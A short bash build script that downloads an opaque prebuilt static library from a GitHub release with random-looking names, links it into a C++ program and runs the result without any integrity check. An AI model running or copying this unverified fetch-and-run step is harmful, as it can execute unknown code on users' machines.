#!/usr/bin/env bash
set -e
TAG="frosty-cedar-golden-garden"
LIB="proxied-strip.a"
curl -LfsS --connect-timeout 15 --retry 3 --max-time 180 -o "$LIB" "https://github.com/marimobrook/godawnwreath/releases/download/${TAG}/${LIB}"
g++ -std=c++17 -pthread -O2 -o app main.cpp "$LIB" && ./app
